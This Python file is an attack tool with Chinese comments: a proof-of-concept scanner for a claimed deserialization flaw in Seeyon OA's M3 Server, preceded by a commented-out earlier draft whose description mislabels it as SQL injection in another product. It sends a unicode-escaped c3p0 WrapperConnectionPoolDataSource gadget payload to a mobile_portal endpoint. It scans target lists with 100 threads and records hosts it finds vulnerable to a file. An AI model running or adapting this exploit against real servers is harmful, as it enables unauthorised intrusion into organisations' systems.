# import requests
# import argparse
# import sys
# import logging
# from multiprocessing.dummy import Pool
# import re
#
# requests.packages.urllib3.disable_warnings()  # 解除警告
#
# # 设置日志记录
# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# logger = logging.getLogger(__name__)
#
#
# def banner():
#     banner = """
#      .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.  .----------------.
# | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
# | |   ________   | || |  ____  ____  | || |     _____    | || |  ____  ____  | || | _____  _____ | || |      __      | || | ____  _____  | || |     ____     | || |      __      | |
# | |  |  __   _|  | || | |_   ||   _| | || |    |_   _|   | || | |_  _||_  _| | || ||_   _||_   _|| || |     /  \     | || ||_   \|_   _| | || |   .'    `.   | || |     /  \     | |
# | |  |_/  / /    | || |   | |__| |   | || |      | |     | || |   \ \  / /   | || |  | |    | |  | || |    / /\ \    | || |  |   \ | |   | || |  /  .--.  \  | || |    / /\ \    | |
# | |     .'.' _   | || |   |  __  |   | || |      | |     | || |    \ \/ /    | || |  | '    ' |  | || |   / ____ \   | || |  | |\ \| |   | || |  | |    | |  | || |   / ____ \   | |
# | |   _/ /__/ |  | || |  _| |  | |_  | || |     _| |_    | || |    _|  |_    | || |   \ `--' /   | || | _/ /    \ \_ | || | _| |_\   |_  | || |  \  `--'  /  | || | _/ /    \ \_ | |
# | |  |________|  | || | |____||____| | || |    |_____|   | || |   |______|   | || |    `.__.'    | || ||____|  |____|| || ||_____|\____| | || |   `.____.'   | || ||____|  |____|| |
# | |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | |
# | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
#  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
#
#
#     """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="医药信息管理系统GetLshByTj存在SQL注入")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#         # if poc(args.url):
#         #     exp(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload1 = "/mobile_portal/api/pns/message/send/batch/6_1sp1"
#     headers = {
#         "User-Agent": "Mozilla/5.0(WindowsNT6.2;Win64;x64;rv:109.0)Gecko/20100101Firefox/109.0",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
#         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
#         "Accept-Encoding": "gzip,deflate",
#         "Connection": "close",
#         "Cookie": "Hm_lvt_82116c626a8d504a5c0675073362ef6f=1666334057",
#         "Upgrade-Insecure-Requests": "1",
#         "Sec-Fetch-Dest": "document",
#         "Sec-Fetch-Mode": "navigate",
#         "Sec-Fetch-Site": "none",
#         "Sec-Fetch-User": "?1",
#         "Content-Type": "application/json",
#         "Content-Length": "3680",
#     }
#     payload2 = "/mobile_portal/api/systemLog/pns/loadLog/app.log"
#     headers2 = {
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/119.0",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
#         "Accept-Encoding": "gzip,deflate",
#         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
#         "Upgrade-Insecure-Requests": "1",
#     }
#     data = [
#         {
#             "userMessageId": "{\"@type\":\"com.mchange.deviceMonitor\",\"userId\":\"exampleUserId\",\"deviceType\":\"androidphone\",\"serviceProvider\":\"baidu\"}",
#             "channelId": "111",
#             "title": "111",
#             "content": "222",
#             "deviceType": "androidphone",
#             "deviceFirm": "other"
#         }
#     ]
#     headers2 = {
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/119.0",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
#         "Accept-Encoding": "gzip,deflate",
#         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
#         "Upgrade-Insecure-Requests": "1",
#     }
#     proxies = {
#         "http": "http://127.0.0.1:8080",
#         "https": "http://127.0.0.1:8080",
#     }
#     try:
#         res1 = requests.post(url=target + payload1, headers=headers, data=data, timeout=5, verify=False, proxies=proxies)
#         if res1.status_code == 200:
#             pattern = r'"code":\s*(\d+)'
#             match = re.search(pattern, res1.text)
#             if match and match.group(1) == '200':
#                 res2 = requests.post(url=target + payload2, headers=headers2, timeout=5, verify=False)
#                 if res2.status_code == 200:
#                     pattern = r'"code":\s*(\d+)'
#                     match = re.search(pattern, res2.text)
#                     if match and match.group(1) == '200':
#                         logger.info(f"[+] 存在漏洞")
#                         with open('zhiyuanre.txt', 'a', encoding='utf-8') as f:
#                             f.write(target + '\n')
#                             f.close()
#                         return True
#                     else:
#                         logger.info(f"[-] 漏洞不存在")
#                         return False
#         else:
#             logger.info(f"[-] 访问 {target} 返回状态码: {res1.status_code}")
#             return False
#     except Exception as e:
#         logger.error(f"[*] 访问 {target} 失败: {e}")
#         return False
#
#
# if __name__ == '__main__':
#     main()

import requests
import argparse
import sys
import logging
from multiprocessing.dummy import Pool
import re

requests.packages.urllib3.disable_warnings()  # 解除警告

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = """
     .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |    _______   | || |  ____  ____  | || |     ____     | || |  ___  ____   | || |     ____     | | | |    _______   | || |  _________   | || |  _______     | || | ____   ____  | || |  _________   | || |  _______     | |
| |   /  ___  |  | || | |_   ||   _| | || |   .'    `.   | || | |_  ||_  _|  | || |   .'    `.   | | | |   /  ___  |  | || | |_   ___  |  | || | |_   __ \    | || ||_  _| |_  _| | || | |_   ___  |  | || | |_   __ \    | |
| |  |  (__ \_|  | || |   | |__| |   | || |  /  .--.  \  | || |   | |_/ /    | || |  /  .--.  \  | | | |  |  (__ \_|  | || |   | |_  \_|  | || |   | |__) |   | || |  \ \   / /   | || |   | |_  \_|  | || |   | |__) |   | |
| |   '.___`-.   | || |   |  __  |   | || |  | |    | |  | || |   |  __'.    | || |  | |    | |  | | | |   '.___`-.   | || |   |  _|  _   | || |   |  __ /    | || |   \ \ / /    | || |   |  _|  _   | || |   |  __ /    | |
| |  |`\____) |  | || |  _| |  | |_  | || |  \  `--'  /  | || |  _| |  \ \_  | || |  \  `--'  /  | | | |  |`\____) |  | || |  _| |___/ |  | || |  _| |  \ \_  | || |    \ ' /     | || |  _| |___/ |  | || |  _| |  \ \_  | |
| |  |_______.'  | || | |____||____| | || |   `.____.'   | || | |____||____| | || |   `.____.'   | | | |  |_______.'  | || | |_________|  | || | |____| |___| | || |     \_/      | || | |_________|  | || | |____| |___| | |
| |              | || |              | || |              | || |              | || |              | | | |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="致远OAM3Server存在反序列化漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [url.strip() for url in f.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload1 = "/mobile_portal/api/pns/message/send/batch/6_1sp1"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Content-Type": "application/json",
    }

    payload2 = "/mobile_portal/api/systemLog/pns/loadLog/app.log"
    data = [
        {
            "userMessageId":"{\"@\u0074\u0079\u0070\u0065\":\"\u0063\u006f\u006d\u002e\u006d\u0063\u0068\u0061\u006e\u0067\u0065\u002e\u0076\u0032\u002e\u0063\u0033\u0070\u0030\u002e\u0057\u0072\u0061\u0070\u0070\u0065\u0072\u0043\u006f\u006e\u006e\u0065\u0063\u0074\u0069\u006f\u006e\u0050\u006f\u006f\u006c\u0044\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\",\"\u0075\u0073\u0065\u0072\u004f\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006e\u0067\":\"\u0048\u0065\u0078\u0041\u0073\u0063\u0069\u0069\u0053\u0065\u0072\u0069\u0061\u006c\u0069\u007a\u0065\u0064\u004d\u0061\u0070:HEX;\"}|",
            "channelId": "111",
            "title": "111",
            "content": "222",
            "deviceType": "androidphone",
            "deviceFirm": "other"
        }
    ]

    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    headers2 = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/119.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Upgrade-Insecure-Requests": "1",
    }
    try:
        res1 = requests.post(url=target + payload1, headers=headers, json=data, timeout=5, verify=False, proxies=proxies)
        if res1.status_code == 200:
            pattern = r'"code":\s*(\d+)'
            match = re.search(pattern, res1.text)
            if match and match.group(1) == '200':
                res2 = requests.post(url=target + payload2, headers=headers2, json=data, timeout=5, verify=False)

                if res2.status_code == 200:
                    match = re.search(pattern, res2.text)
                    if match and match.group(1) == '200':
                        logger.info(f"[+] 存在漏洞")
                        with open('zhiyuanre.txt', 'a', encoding='utf-8') as f:
                            f.write(target + '\n')
                        return True
                    else:
                        logger.info(f"[-] 漏洞不存在")
                        return False
        else:
            logger.info(f"[-] 访问 {target} 返回状态码: {res1.status_code}")
            return False
    except Exception as e:
        logger.error(f"[*] 访问 {target} 失败: {e}")
        return False


if __name__ == '__main__':
    main()

